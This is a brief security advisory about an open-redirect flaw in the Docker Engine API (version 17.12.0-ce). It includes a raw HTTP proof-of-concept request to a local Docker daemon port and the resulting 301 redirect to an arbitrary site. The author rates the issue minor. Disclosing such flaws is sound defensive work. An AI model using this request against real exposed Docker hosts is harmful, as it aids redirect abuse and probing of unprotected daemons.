Docker Registry API Doesn't Sanitise `Location' Header


It was discovered that Docker API did not properly sanitise the resource path before serving a 301 redirect response.
Proof Of Concept:
REQUEST:
GET https://www.google.com HTTP/1.1
Host: 172.17.0.1:2375

RESPONSE:
HTTP/1.1 301 Moved Permanently
Location: https://www.google.com/
Date: Mon, 19 Feb 2018 11:30:01 GMT
Content-Length: 0
Content-Type: text/plain; charset=utf-8

Note: The Docker API are NOT supposed to be called in a browser, so this issue should be considered as a minor one. In addition, exposing the API on a TCP socket is NEVER recommended!
Tested on:
Server:
 Engine:
  Version:    17.12.0-ce
  API version:    1.35 (minimum version 1.12)
  Go version:    go1.9.2

  Experimental:    false
